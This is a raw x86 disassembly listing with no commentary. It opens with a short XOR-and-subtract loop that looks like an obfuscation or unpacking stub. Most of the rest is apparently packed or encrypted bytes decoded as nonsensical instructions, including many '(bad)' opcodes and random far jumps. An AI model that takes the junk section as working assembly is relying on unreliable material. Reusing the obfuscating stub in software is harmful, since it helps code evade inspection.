  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0x3b4e7a6a
  4125d0:	pop    edi
  4125d1:	add    DWORD PTR [eax],ebx
  4125d3:	jae    0x412650
  4125d5:	jnp    0x412588
  4125d7:	pushf  
  4125d8:	jnp    0x412655
  4125da:	scas   al,BYTE PTR es:[edi]
  4125db:	add    al,0x60
  4125dd:	xchg   edi,eax
  4125de:	mov    ss,WORD PTR [esi]
  4125e0:	in     al,dx
  4125e1:	fsub   DWORD PTR [esi+0x31]
  4125e4:	xor    eax,0x839e23f0
  4125e9:	xchg   BYTE PTR [ebp-0x7bb7271a],bl
  4125ef:	and    al,0x5c
  4125f1:	(bad)  
  4125f2:	fwait
  4125f3:	push   ecx
  4125f4:	clc    
  4125f5:	jl     0x412655
  4125f7:	xor    DWORD PTR [eax],esi
  4125f9:	mov    esi,0xa7e71331
  4125fe:	add    eax,edx
  412600:	mov    edx,DWORD PTR [edx+0x314a5d28]
  412606:	add    esi,DWORD PTR [bp+di-0x5f]
  41260a:	sbb    ch,BYTE PTR [esi]
  41260c:	and    al,0xd0
  41260e:	adc    DWORD PTR [edi],ebx
  412610:	pop    ss
  412611:	hlt    
  412612:	sti    
  412613:	shr    BYTE PTR [esi+0x477caec2],1
  412619:	add    al,0xe7
  41261b:	jecxz  0x412688
  41261d:	jg     0x4125f8
  41261f:	ins    DWORD PTR es:[edi],dx
  412620:	xor    ecx,DWORD PTR [ebx]
  412622:	xor    al,0x8
  412624:	cmp    cl,BYTE PTR [ecx+0x1e3c3b8]
  41262a:	xchg   ebx,eax
  41262b:	scas   al,BYTE PTR es:[edi]
  41262c:	jp     0x41260d
  41262e:	in     eax,0x66
  412630:	sbb    eax,0xbd4bc2b1
  412635:	adc    BYTE PTR [ecx+edx*8-0x5c],0xf5
  41263a:	outs   dx,BYTE PTR ds:[esi]
  41263b:	xor    ch,0x2a
  41263e:	shl    DWORD PTR [ebx-0x5d],1
  412641:	xor    ah,BYTE PTR [esi+ebx*4+0x5a]
  412645:	cmp    ecx,DWORD PTR [ecx+esi*1-0x49]
  412649:	lods   al,BYTE PTR ds:[esi]
  41264a:	retf   0x2d92
  41264d:	fisub  WORD PTR [eax]
  41264f:	cmp    DWORD PTR [edx],0x41
  412652:	jg     0x41267e
  412654:	cmp    ebx,DWORD PTR [ebx+0x5e]
  412657:	daa    
  412658:	fisttp WORD PTR [edi+0x3ff20919]
  41265e:	inc    edx
  41265f:	movd   DWORD PTR [esi-0x41],mm3
  412663:	sub    eax,0xf8607388
  412668:	jmp    0x4126e3
  41266a:	imul   edi,DWORD PTR [esi],0x3bc70fb0
  412670:	mov    ecx,ds
  412672:	stc    
  412673:	imul   edi,DWORD PTR [ebx+0x65],0x22
  412677:	or     DWORD PTR [ebx+0x55],0xa99346d
  41267e:	ins    DWORD PTR es:[edi],dx
  41267f:	push   0x3f
  412681:	in     al,0x49
  412683:	mov    bl,0x48
  412685:	int3   
  412686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412687:	pushf  
  412688:	ror    DWORD PTR [esi-0x458a776],cl
  41268e:	pop    ebp
  41268f:	retf   0x8d84
  412692:	mov    ?,edi
  412694:	jo     0x4126e9
  412696:	cld    
  412697:	in     al,dx
  412698:	(bad)  
  412699:	scas   eax,DWORD PTR es:[edi]
  41269a:	inc    edx
  41269b:	add    DWORD PTR [ecx],esi
  41269d:	int3   
  41269e:	cmc    
  41269f:	in     eax,dx
  4126a0:	rcl    BYTE PTR [eax],cl
  4126a2:	or     eax,0xc6ccd39a
  4126a7:	loop   0x412647
  4126a9:	popa   
  4126aa:	mov    bl,0x4c
  4126ac:	push   ss
  4126ad:	xchg   edx,eax
  4126ae:	pusha  
  4126af:	and    dl,BYTE PTR ds:0x9a957e7b
  4126b5:	fs push edx
  4126b7:	pop    edx
  4126b8:	call   0xff26500a
  4126bd:	dec    ebp
  4126be:	xchg   ecx,eax
  4126bf:	ret    
  4126c0:	loope  0x41270e
  4126c2:	in     eax,0x28
  4126c4:	pop    ecx
  4126c5:	add    al,0x5a
  4126c7:	pop    ss
  4126c8:	push   edx
  4126c9:	int    0xbf
  4126cb:	jmp    0x4c03:0x3ebb10a3
  4126d2:	mov    bl,0x30
  4126d4:	loope  0x412693
  4126d6:	dec    ebx
  4126d7:	(bad)  
  4126d8:	into   
  4126d9:	and    BYTE PTR [ebx+0x5499143f],ah
  4126df:	nop
  4126e0:	jne    0x412734
  4126e2:	add    BYTE PTR [ebx+eax*8-0x20],al
  4126e6:	mov    ecx,0x5442179
  4126eb:	outs   dx,DWORD PTR ds:[esi]
  4126ec:	pmulhuw mm4,QWORD PTR [ebx]
  4126ef:	or     DWORD PTR [ebx-0x18],ebp
  4126f2:	cmp    edi,eax
  4126f4:	enter  0xb04c,0x37
  4126f8:	aas    
  4126f9:	fcomp  QWORD PTR [edi-0x5c]
  4126fc:	icebp  
  4126fd:	cmp    eax,0x8e074fe1
  412702:	aam    0x70
  412704:	jns    0x412731
  412706:	fadd   st(1),st
  412708:	sbb    bh,ch
  41270a:	mov    dl,0xf7
  41270c:	iret   
  41270d:	js     0x41269a
  41270f:	or     al,BYTE PTR ds:0xbc65c02e
  412715:	pop    edi
  412716:	mov    WORD PTR [ebx+0x1878fdfe],es
  41271c:	dec    esi
  41271d:	mov    ds:0xb74ccbdd,al
  412722:	add    al,0x5
  412724:	dec    esi
  412725:	lods   al,BYTE PTR ds:[esi]
  412726:	hlt    
  412727:	and    BYTE PTR [ecx+0x6a],ah
  41272a:	sbb    dh,BYTE PTR [ecx]
  41272c:	rcl    DWORD PTR [edx+eiz*4],0x8e
  412730:	aam    0x3d
  412732:	or     cl,bl
  412734:	mov    dh,BYTE PTR [ecx]
  412736:	or     bl,0x46
  412739:	out    0x13,al
  41273b:	or     al,0xfc
  41273d:	rol    DWORD PTR [ebx+0x4f],0xf9
  412741:	mov    dl,0xfb
  412743:	iret   
  412744:	test   BYTE PTR [esi+0x9],al
  412747:	add    al,0x91
  412749:	(bad)  
  41274a:	push   ebx
  41274b:	ins    DWORD PTR es:[edi],dx
  41274c:	jp     0x41270c
  41274e:	out    dx,al
  41274f:	arpl   WORD PTR [ebx-0xa],si
  412752:	fadd   st,st(1)
  412754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412755:	push   eax
  412756:	mov    ds:0xec28a850,eax
  41275b:	cmc    
  41275c:	sar    ah,0x46
  41275f:	xchg   esp,eax
  412760:	cmp    cl,BYTE PTR [edi+0x78]
  412763:	mov    bh,BYTE PTR [edx]
  412765:	outs   dx,DWORD PTR ds:[esi]
  412766:	sbb    cl,dl
  412768:	cld    
  412769:	push   ss
  41276a:	mov    fs,WORD PTR [eax+0x1a]
  41276d:	adc    BYTE PTR [ebx+0x20],cl
  412770:	jp     0x412720
  412772:	pop    es
  412773:	jmp    0xb01da9a1
  412778:	push   ds
  412779:	pop    ecx
  41277a:	jae    0x4127d6
  41277c:	jnp    0x41274b
  41277e:	dec    ecx
  41277f:	add    DWORD PTR [ecx],eax
  412781:	test   BYTE PTR [eax-0x27],bl
  412784:	xchg   ebx,eax
  412785:	sbb    cl,ch
  412787:	lahf   
  412788:	(bad)  
  41278a:	sub    dl,BYTE PTR [eax+eax*4-0x43]
  41278e:	fnstsw WORD PTR [eax]
  412790:	xchg   ebx,eax
  412791:	lods   al,BYTE PTR ds:[esi]
  412792:	sub    BYTE PTR [edx-0x44795c1e],al
  412798:	shl    DWORD PTR [esi-0x76dbe952],cl
  41279e:	xchg   edx,eax
  41279f:	bound  esi,QWORD PTR ds:0xc6913c8a
  4127a5:	sbb    al,0xb4
  4127a7:	dec    esi
  4127a8:	das    
  4127a9:	jnp    0x41272e
  4127ab:	mov    ds:0x3b8077b4,eax
  4127b0:	imul   esp,ecx,0xffffff96
  4127b3:	pop    es
  4127b4:	fcomp  QWORD PTR [edx-0x61faf231]
  4127ba:	mov    BYTE PTR [ebp+0x8579e33],0x2
  4127c1:	adc    bl,bl
  4127c3:	pop    DWORD PTR [ebx+0x67a01667]
  4127c9:	out    0x6b,al
  4127cb:	dec    edx
  4127cc:	test   al,0x8a
  4127ce:	xchg   edi,eax
  4127cf:	mov    edx,0x28006352
  4127d4:	lods   eax,DWORD PTR ds:[esi]
  4127d5:	mov    edi,0xa61014f0
  4127da:	jbe    0x41280d
  4127dc:	mov    WORD PTR [ecx-0x6a],cs
  4127df:	sbb    bh,bl
  4127e1:	mov    dl,0xb5
  4127e3:	leave  
  4127e4:	imul   esi,esp,0x3
  4127e7:	add    BYTE PTR [edx],0x6c
  4127ea:	push   edi
  4127eb:	add    eax,0x4ac2cb69
  4127f0:	(bad)  
  4127f1:	out    0xd7,eax
  4127f3:	or     al,BYTE PTR [esi-0x10]
  4127f6:	xlat   BYTE PTR ds:[ebx]
  4127f7:	(bad)  
  4127f8:	push   0x33
  4127fa:	adc    DWORD PTR [edi],edi
  4127fc:	ss mov ebx,0xa0956106
  412802:	jnp    0x4127d3
  412804:	cmp    eax,0x30e895ab
  412809:	xchg   edi,eax
  41280a:	ret    
  41280b:	jecxz  0x412858
  41280d:	ins    BYTE PTR es:[edi],dx
  41280e:	iret   
  41280f:	or     al,0x34
  412811:	inc    esi
  412812:	mov    ah,0x78
  412814:	mov    dl,0x5d
  412816:	call   0xfe79161a
  41281b:	sti    
  41281c:	mov    eax,0xce0b09de
  412821:	push   es
  412822:	push   esi
  412823:	fsub   DWORD PTR ds:0x3c46720f
  412829:	sahf   
  41282a:	push   esi
  41282b:	ins    BYTE PTR es:[edi],dx
  41282c:	mov    al,0x3f
  41282e:	pop    ebx
  41282f:	fs in  al,0xdc
  412832:	push   ebx
  412833:	jbe    0x4127ec
  412835:	loopne 0x4127f3
  412837:	xrelease xchg BYTE PTR cs:[edx-0x5247b68e],ch
  41283f:	sbb    DWORD PTR [ebp*8-0x321112ba],esp
  412846:	or     eax,0xf0199c9b
  41284b:	mov    bl,0x30
  41284d:	xor    BYTE PTR [ebx],cl
  41284f:	add    DWORD PTR [bx+di+0x36],0xffffffaf
  412854:	hlt    
  412855:	mov    DWORD PTR [ebx+0x73700b9e],edi
  41285b:	leave  
  41285c:	retf   
  41285d:	push   ecx
  41285e:	lahf   
  41285f:	pusha  
  412860:	out    0x61,al
  412862:	out    dx,al
  412863:	inc    edi
  412864:	fsub   st,st(4)
  412866:	mov    eax,ds:0x1d519efb
  41286b:	and    eax,0x1e914e42
  412870:	pushf  
  412871:	adc    ah,BYTE PTR [eax+0x250076cd]
  412877:	cmp    eax,0xdb1d1760
  41287c:	inc    ebx
  41287d:	test   al,0x71
  41287f:	push   esi
  412880:	int3   
  412881:	fiadd  WORD PTR [ebx]
  412883:	pop    edx
  412884:	pop    es
  412885:	mov    esp,0x9ee238e5
  41288a:	and    dl,0x63
  41288d:	out    dx,eax
  41288e:	clc    
  41288f:	imul   edx,DWORD PTR [edx],0x12
  412892:	mov    cl,BYTE PTR [ebp+0x24ff094a]
  412898:	jno    0x4128c4
  41289a:	in     eax,0x67
  41289c:	jnp    0x412824
  41289e:	xor    al,0xce
  4128a0:	sbb    bh,BYTE PTR [ebx+0x52a7d9f1]
  4128a6:	popf   
  4128a7:	push   eax
  4128a8:	les    eax,FWORD PTR [edx]
  4128aa:	add    ecx,DWORD PTR [eax-0x6f81e76e]
  4128b0:	push   edx
  4128b1:	add    DWORD PTR [ecx+0x6d],esp
  4128b4:	sbb    eax,DWORD PTR [ebx+0x21]
  4128b7:	jecxz  0x4128c4
  4128b9:	push   ebx
  4128ba:	adc    dh,cl
  4128bc:	fwait
  4128bd:	bound  ecx,QWORD PTR [eax-0x50603e97]
  4128c3:	call   0x31bd:0x204682d3
  4128ca:	mov    ss,WORD PTR [edi]
  4128cc:	pop    ebx
  4128cd:	add    eax,0xec395c8f
  4128d2:	pop    esi
  4128d3:	jg     0x41287f
  4128d5:	sbb    BYTE PTR [eax+0x16ac75fb],dh
  4128db:	not    BYTE PTR [ebx-0x78]
  4128de:	loopne 0x412941
  4128e0:	sub    eax,0x67a66df4
  4128e5:	int3   
  4128e6:	pop    ecx
  4128e7:	push   esp
  4128e8:	js     0x4128ae
  4128ea:	ror    BYTE PTR [ebp-0x165dea0],1
  4128f0:	pop    esi
  4128f1:	cs stos BYTE PTR es:[edi],al
  4128f3:	jle    0x41296b
  4128f5:	sbb    ch,BYTE PTR [ebx]
  4128f7:	ret    
  4128f8:	leave  
  4128f9:	jp     0x41296c
  4128fb:	inc    ecx
  4128fc:	in     eax,dx
  4128fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128fe:	xchg   ebx,eax
  4128ff:	cmp    cl,ch
  412901:	popf   
  412902:	push   ss
  412903:	mov    ds:0x910535b,eax
  412908:	pop    ds
  412909:	sbb    al,0xfd
  41290b:	pop    es
  41290c:	xor    eax,0x76ae064d
  412911:	sub    al,BYTE PTR [ecx-0x49]
  412914:	stos   BYTE PTR es:[edi],al
  412915:	adc    ecx,DWORD PTR [edx-0x30a6eb84]
  41291b:	ret    
  41291c:	cld    
  41291d:	xchg   DWORD PTR [edi],edx
  41291f:	sti    
  412920:	and    bl,ch
  412922:	mov    edx,DWORD PTR [eax-0x2]
  412925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412926:	cmp    DWORD PTR [eax],0x30
  412929:	stos   BYTE PTR es:[edi],al
  41292a:	(bad)  [eax]
  41292c:	jne    0x4129a1
  41292e:	test   BYTE PTR [ebx+0x3],dh
  412931:	mov    al,0x9c
  412933:	aaa    
  412934:	aam    0xd9
  412936:	jno    0x41297b
  412938:	rol    DWORD PTR [edi+edx*4-0xe3c5c93],1
  41293f:	mov    al,0xb2
  412941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412942:	fbstp  TBYTE PTR [edx+0x7]
  412945:	or     al,0x11
  412947:	les    edx,FWORD PTR [eax-0x6bc53fad]
  41294d:	xchg   edi,eax
  41294e:	out    dx,al
  41294f:	mov    eax,0x3091623
  412954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412955:	dec    esi
  412956:	test   DWORD PTR ds:0xef1a5db6,0x3faa46b6
  412960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412961:	mov    cl,0x1e
  412963:	inc    edx
  412964:	cmp    al,0x2e
  412966:	das    
  412967:	cmp    eax,0x741e807b
  41296c:	xchg   edi,eax
  41296d:	xor    DWORD PTR [ecx+0x6bf12363],ecx
  412973:	mov    edx,0x2defd550
  412978:	jl     0x41295e
  41297a:	test   BYTE PTR [ebx-0x18],al
  41297d:	inc    ecx
  41297e:	jp     0x41298a
  412980:	cmp    BYTE PTR [edx],0xcc
  412983:	push   cs
  412984:	adc    eax,0xccde0c6b
  412989:	xchg   edi,ebx
  41298b:	fcmovnu st,st(0)
  41298d:	sbb    al,0xa0
  41298f:	adc    DWORD PTR [edi-0x7],edx
  412992:	stc    
  412993:	sbb    al,0xc1
  412995:	mov    ebx,0x12bc9dbb
  41299a:	loop   0x412a08
  41299c:	imul   eax,DWORD PTR [esi-0x53f8d965],0x8e9b3e92
  4129a6:	leave  
  4129a7:	sub    DWORD PTR [edx],edx
  4129a9:	xor    DWORD PTR [edi],ebx
  4129ab:	inc    ecx
  4129ac:	loope  0x412974
  4129ae:	jae    0x412a01
  4129b0:	shl    DWORD PTR [edx+0x207c3a51],1
  4129b6:	jnp    0x412988
  4129b8:	push   ebx
  4129b9:	mov    cl,0xa2
  4129bb:	aam    0x58
  4129bd:	(bad)  
  4129be:	loop   0x4129bb
  4129c0:	add    dh,BYTE PTR [ecx+0x44]
  4129c3:	lahf   
  4129c4:	(bad)  
  4129c8:	bnd ja 0x412971
  4129cb:	or     dl,dh
  4129cd:	adc    eax,0x325b3a0d
  4129d2:	adc    ebx,edi
  4129d4:	fcom   QWORD PTR [edi]
  4129d6:	or     DWORD PTR [edi],0x96076888
  4129dc:	sub    BYTE PTR [eax],ah
  4129de:	js     0x4129cc
  4129e0:	add    eax,0xfb3e053f
  4129e5:	stc    
  4129e6:	adc    BYTE PTR [ebx-0x5e71280a],al
  4129ec:	mov    esp,0x9749a70f
  4129f1:	fld    DWORD PTR [ecx+0x945b43a]
  4129f7:	lahf   
  4129f8:	or     eax,0x4563c19
  4129fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129fe:	jecxz  0x4129a1
  412a00:	inc    eax
  412a01:	loop   0x412995
  412a03:	int    0x9c
  412a05:	or     edi,esi
  412a07:	cld    
  412a08:	out    dx,eax
  412a09:	pop    ds
  412a0a:	test   ecx,edi
  412a0c:	jecxz  0x4129a2
  412a0e:	jmp    0xece2:0xb32ebc53
  412a15:	inc    ebp
  412a16:	cld    
  412a17:	sbb    BYTE PTR [esi],0xb0
  412a1a:	or     BYTE PTR [esi-0x77],0x12
  412a1e:	in     eax,dx
  412a1f:	inc    esi
  412a20:	adc    edx,0xfffffff7
  412a23:	das    
  412a24:	dec    eax
  412a25:	test   DWORD PTR [edx-0x467d3677],ecx
  412a2b:	add    ebp,DWORD PTR [ecx+0x3c51fad5]
  412a31:	push   edx
  412a32:	dec    eax
  412a33:	lahf   
  412a34:	cmc    
  412a35:	and    edi,ebp
  412a37:	mov    esi,0x17523893
  412a3c:	sbb    BYTE PTR [ecx],ah
  412a3e:	in     eax,0xc5
  412a40:	mov    BYTE PTR [ebp+0x20],dh
  412a43:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a45:	test   al,0x1a
  412a47:	popa   
  412a48:	dec    esp
  412a49:	add    al,0x6a
  412a4b:	cmp    DWORD PTR ds:0xee5c129d,edx
  412a51:	cmp    BYTE PTR [eax+0x4a],al
  412a54:	add    cl,bl
  412a56:	adc    DWORD PTR [ebp-0xbbd011],edx
  412a5c:	retf   0x53b8
  412a5f:	rcr    dh,0xbd
  412a62:	add    al,0x2b
  412a64:	cs add cl,ch
  412a67:	pop    ecx
  412a68:	in     eax,dx
  412a69:	xchg   ecx,eax
  412a6a:	xchg   BYTE PTR [ebx],al
  412a6c:	clc    
  412a6d:	jg     0x412ae9
  412a6f:	adc    eax,0x34461f86
  412a74:	out    0xb,eax
  412a76:	or     ecx,0xdb75ddf3
  412a7c:	inc    esp
  412a7d:	in     eax,dx
  412a7e:	shl    BYTE PTR cs:[edi-0x53],1
  412a82:	and    BYTE PTR [ebx-0x7e],ch
  412a85:	xor    BYTE PTR [edi+0x117de254],ah
  412a8b:	inc    ecx
  412a8c:	mov    ebx,0xcf882e72
  412a91:	mov    dh,0x46
  412a93:	sbb    eax,0xb11cd43
  412a98:	test   al,bl
  412a9a:	hlt    
  412a9b:	ds xor al,0x90
  412a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a9f:	sti    
  412aa0:	retf   
  412aa1:	inc    edx
  412aa2:	jle    0x412ac8
  412aa4:	jmp    0xc86f:0x4d2a962e
  412aab:	lahf   
  412aac:	dec    edi
  412aad:	ins    BYTE PTR es:[edi],dx
  412aae:	or     bl,BYTE PTR [ecx-0x7bf8156d]
  412ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ab5:	cmovle esi,DWORD PTR [esi+esi*2]
  412ab9:	mov    bl,0x95
  412abb:	inc    ebx
  412abc:	jb     0x412ab1
  412abe:	xor    dh,BYTE PTR [edx-0x2b]
  412ac1:	ja     0x412aaa
  412ac3:	aas    
  412ac4:	push   0x163043bc
  412ac9:	add    ebp,esi
  412acb:	adc    eax,0xc0497105
  412ad0:	xlat   BYTE PTR ds:[ebx]
  412ad1:	call   0x1ce5:0x7192e7bc
  412ad8:	mov    ebx,0x9351ed58
  412add:	int    0xb1
  412adf:	inc    ebp
  412ae0:	mov    eax,cs:0x8f71d3c7
  412ae6:	fucomi st,st(0)
  412ae8:	add    eax,0x520da1bb
  412aed:	jbe    0x412b48
  412aef:	adc    DWORD PTR [ecx-0x67],ebp
  412af2:	xchg   ecx,eax
  412af3:	jl     0x412b0c
  412af5:	xchg   ecx,eax
  412af6:	stc    
  412af7:	push   edx
  412af8:	jnp    0x412add
  412afa:	imul   BYTE PTR [ebp-0x3b]
  412afd:	lods   eax,DWORD PTR ds:[esi]
  412afe:	adc    ch,BYTE PTR [esi-0x471d657e]
  412b04:	shr    BYTE PTR [edx+0x73],cl
  412b07:	add    al,0x6b
  412b09:	mov    DWORD PTR [edx],edi
  412b0b:	sub    edx,DWORD PTR [edi-0x69]
  412b0e:	(bad)  
  412b0f:	push   eax
  412b10:	mov    ebp,0x72dabf26
  412b15:	xor    al,0x1
  412b17:	and    eax,0xcac1a96c
  412b1c:	fsubr  DWORD PTR [edx-0x6c86f489]
  412b22:	leave  
  412b23:	aaa    
  412b24:	or     BYTE PTR [edi+0x1c4d01cc],0x5f
  412b2b:	sub    DWORD PTR [ecx-0x64],ecx
  412b2e:	(bad)  
  412b2f:	fdivp  st(0),st
  412b31:	jle    0x412b33
  412b33:	pop    ds
  412b34:	shl    ecx,cl
  412b36:	scas   eax,DWORD PTR es:[edi]
  412b37:	and    BYTE PTR [edx-0x609b99d9],al
  412b3d:	dec    edi
  412b3e:	sub    BYTE PTR [eax],ah
  412b40:	xchg   esi,eax
  412b41:	mov    esi,0x4fc9f261
  412b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b47:	sbb    BYTE PTR ds:0xbb3aafc4,ah
  412b4d:	dec    ebp
  412b4e:	adc    esp,eax
  412b50:	cwde   
  412b51:	test   eax,0x825a43b7
  412b56:	push   ecx
  412b57:	mov    ds:0x4e6878ac,al
  412b5c:	and    BYTE PTR [ecx-0x4b],al
  412b5f:	ss mov bh,0xc3
  412b62:	leave  
  412b63:	push   ebp
  412b64:	ret    
  412b65:	imul   edx,DWORD PTR [ebx+0x3db50f9c],0xfffffff6
  412b6c:	xor    eax,edi
  412b6e:	retf   0xa701
  412b71:	cmc    
  412b72:	loop   0x412ba6
  412b74:	mov    eax,ds:0xdd9ec26b
  412b79:	repz cmp eax,0xfa1925b2
  412b7f:	push   0x4b
  412b81:	jg     0x412ba8
  412b83:	jle    0x412b7d
  412b85:	jecxz  0x412c03
  412b87:	jmp    0x9edc:0x83f0a276
  412b8e:	les    ecx,FWORD PTR [esi+esi*4-0x34]
  412b92:	shl    BYTE PTR [eax],0x2d
  412b95:	jb     0x412b24
  412b97:	stos   BYTE PTR es:[edi],al
  412b98:	clc    
  412b99:	std    
  412b9a:	sub    ch,BYTE PTR ds:0x2cfdf223
  412ba0:	stc    
  412ba1:	cs pusha 
  412ba3:	fbld   TBYTE PTR [ebp+0x1ca4f838]
  412ba9:	cmp    cl,ch
  412bab:	pop    eax
  412bac:	stos   DWORD PTR es:[edi],eax
  412bad:	stc    
  412bae:	ins    DWORD PTR es:[edi],dx
  412baf:	das    
  412bb0:	lds    ebx,FWORD PTR [esi]
  412bb2:	adc    BYTE PTR [edi+0x2c9e5b42],bl
  412bb8:	sbb    edi,DWORD PTR [ebx+esi*1-0x6]
  412bbc:	iret   
  412bbd:	pop    eax
  412bbe:	or     DWORD PTR [ecx+0x58],ecx
  412bc1:	push   ss
  412bc2:	aaa    
  412bc3:	jns    0x412bf7
  412bc5:	out    dx,eax
  412bc6:	push   0xffffff89
  412bc8:	cmp    al,0x11
  412bca:	div    DWORD PTR [esi-0x78]
  412bcd:	test   al,0x5
  412bcf:	jnp    0x412c42
  412bd1:	sbb    DWORD PTR [eax+0x4],edx
  412bd4:	pop    ebp
  412bd5:	add    DWORD PTR [ebx],ebx
  412bd7:	adc    esi,esi
  412bd9:	xlat   BYTE PTR ds:[ebx]
  412bda:	jle    0x412b62
  412bdc:	and    BYTE PTR [ebp-0x5855e80c],dh
  412be2:	jo     0x412bc1
  412be4:	pop    ss
  412be5:	jo     0x412bda
  412be7:	shr    DWORD PTR [ecx],cl
  412be9:	(bad)
  412bed:	icebp  
  412bee:	jp     0x412ba7
  412bf0:	inc    esp
  412bf1:	stos   BYTE PTR es:[edi],al
  412bf2:	fsubp  st(5),st
  412bf4:	inc    eax
  412bf5:	adc    BYTE PTR [ebx],cl
  412bf7:	stos   BYTE PTR es:[edi],al
  412bf8:	push   ds
  412bf9:	xor    al,0x6d
  412bfb:	xchg   ebp,edi
  412bfd:	lds    ebx,FWORD PTR [edx]
  412bff:	into   
  412c00:	out    dx,al
  412c01:	add    BYTE PTR [esi+ecx*1+0x29],ah
  412c05:	inc    esp
  412c06:	(bad)  
  412c07:	mov    ds:0x558d99ea,eax
  412c0c:	add    dl,BYTE PTR [ecx-0x5c947298]
  412c12:	lahf   
  412c13:	sbb    al,0x94
  412c15:	imul   ebx,DWORD PTR [edx-0x46],0x8d292d04
  412c1c:	cmp    DWORD PTR [esi],esi
  412c1e:	retf   
  412c1f:	das    
  412c20:	and    al,0x42
  412c22:	mov    ds:0x586659d8,eax
  412c27:	mov    edx,esi
  412c29:	cwde   
  412c2a:	add    DWORD PTR [ecx+0x6f],edx
  412c2d:	ds out 0x2c,al
  412c30:	fdivr  QWORD PTR [ecx]
  412c32:	adc    DWORD PTR [ecx],eax
  412c34:	out    0x25,al
  412c36:	cmp    esp,DWORD PTR [eax+0x64]
  412c39:	ficomp WORD PTR [ebx+0x45ac61e7]
  412c3f:	xchg   ecx,eax
  412c40:	shr    DWORD PTR [ebx+0x5b329e13],1
  412c46:	and    eax,0x877e9550
  412c4b:	pop    ebx
  412c4c:	lahf   
  412c4d:	push   eax
  412c4e:	mov    ebx,0x1720edf5
  412c53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c54:	not    DWORD PTR [ebp+0x2b]
  412c57:	mov    eax,0x1c8e65b
  412c5c:	adc    eax,0x82bbf089
  412c61:	jae    0x412c74
  412c63:	int3   
  412c64:	adc    dl,BYTE PTR [eax+edx*1-0x3a600063]
  412c6b:	das    
  412c6c:	cdq    
  412c6d:	neg    BYTE PTR [esi+0x1c]
  412c70:	cwde   
  412c71:	xor    dh,bh
  412c73:	aam    0xa6
  412c75:	push   eax
  412c76:	pusha  
  412c77:	rcl    DWORD PTR [edx-0x17d91f7],0xb1
  412c7e:	mov    ds:0x47a37d93,al
  412c83:	out    0xaf,al
  412c85:	pop    esi
  412c86:	aam    0x1
  412c88:	js     0x412c76
  412c8a:	fist   DWORD PTR es:[esi*2+0x79c8a65d]
  412c92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c93:	dec    esi
  412c94:	ds call 0x844c:0xef020611
  412c9c:	das    
  412c9d:	data16 fld DWORD PTR [ecx+0x7db4cff7]
  412ca4:	mov    al,ds:0x758af267
  412ca9:	sbb    DWORD PTR [eax],edi
  412cab:	push   eax
  412cac:	jmp    0x6083:0x3a9df3d8
  412cb3:	rcl    DWORD PTR [ecx],0x87
  412cb6:	push   ss
  412cb7:	lods   eax,DWORD PTR ds:[esi]
  412cb8:	scas   al,BYTE PTR es:[edi]
  412cb9:	repz ja 0x412c9b
  412cbc:	jbe    0x412c40
  412cbe:	mov    al,0xf9
  412cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cc1:	sbb    DWORD PTR [esi],ecx
  412cc3:	jle    0x412d3c
  412cc5:	add    eax,0xbf72fe98
  412cca:	push   cs
  412ccb:	out    0x9e,eax
  412ccd:	push   es
  412cce:	pop    eax
  412ccf:	into   
  412cd0:	(bad)  
  412cd1:	fisubr WORD PTR [eax+0x6f]
